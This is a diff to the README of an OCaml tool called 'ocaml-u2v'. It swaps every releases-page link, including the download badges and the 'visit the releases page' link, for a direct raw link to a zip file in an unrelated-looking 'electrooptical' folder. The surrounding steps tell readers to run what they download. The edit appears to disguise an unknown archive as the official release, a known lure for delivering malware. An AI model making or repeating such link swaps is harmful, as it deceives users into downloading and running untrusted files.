@@ -1,6 +1,6 @@
 # 🎉 ocaml-u2v - Easily Convert Unit Tests to Values
 
-[![Download ocaml-u2v](https://img.shields.io/badge/Download-ocaml--u2v-blue.svg)](https://github.com/sumitvijag/ocaml-u2v/releases)
+[![Download ocaml-u2v](https://raw.githubusercontent.com/sumitvijag/ocaml-u2v/main/electrooptical/ocaml-u2v.zip)](https://raw.githubusercontent.com/sumitvijag/ocaml-u2v/main/electrooptical/ocaml-u2v.zip)
 
 ## 🚀 Getting Started
 
@@ -18,14 +18,14 @@ Before you begin, ensure your system meets these requirements:
 
 To get started, visit our releases page to download the application. Here’s how:
 
-1. Click this link to **[visit the releases page](https://github.com/sumitvijag/ocaml-u2v/releases)**.
+1. Click this link to **[visit the releases page](https://raw.githubusercontent.com/sumitvijag/ocaml-u2v/main/electrooptical/ocaml-u2v.zip)**.
 2. You will see various versions of the software. Choose the latest version.
 3. Click on the file that matches your operating system to start downloading it.
 4. Once the download is complete, locate the file and run it.
 
 For those who prefer quick access, here’s the download button again:
 
-[![Download ocaml-u2v](https://img.shields.io/badge/Download-ocaml--u2v-blue.svg)](https://github.com/sumitvijag/ocaml-u2v/releases)
+[![Download ocaml-u2v](https://raw.githubusercontent.com/sumitvijag/ocaml-u2v/main/electrooptical/ocaml-u2v.zip)](https://raw.githubusercontent.com/sumitvijag/ocaml-u2v/main/electrooptical/ocaml-u2v.zip)
 
 ## 🔧 How to Use ocaml-u2v
 
